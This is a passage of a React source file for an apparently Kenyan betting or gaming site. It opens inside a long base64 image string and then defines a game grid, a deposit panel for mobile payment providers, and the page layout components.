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'
    }
  ];

  return (
    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
      {games.map((game, index) => (
        <GameCard key={index} {...game} />
      ))}
    </div>
  );
}

function PaymentMethods() {
  return (
    <div className="bg-[#1a2332] p-4 rounded-lg">
      <h2 className="text-xl text-white mb-4">Paybill Numbers</h2>
      <div className="space-y-4">
        {['Safaricom', 'M-PESA', 'Airtel', 'iPay'].map((provider, index) => (
          <div key={index} className="flex justify-between items-center">
            <span className="text-green-500">{provider}</span>
            <button className="bg-yellow-400 px-4 py-1 rounded font-semibold hover:bg-yellow-500">
              DEPOSIT
            </button>
          </div>
        ))}
      </div>
    </div>
  );
}

function MainContent() {
  return (
    <>
      <Navigation />
      <WinnerTicker />
      <main className="container mx-auto py-4 md:py-8">
        <div className="grid grid-cols-1 lg:grid-cols-4 gap-4 md:gap-8">
          <div className="lg:col-span-1">
            <JackpotSection />
          </div>
          <div className="lg:col-span-2">
            <GameGrid />
          </div>
          <div className="lg:col-span-1">
            <PaymentMethods />
          </div>
        </div>
      </main>
    </>
  );
}

function App() {
  return (
    <div className="min-h-screen bg-[#0f1623]">
      <Header />
    </div>
  );
}

export default App;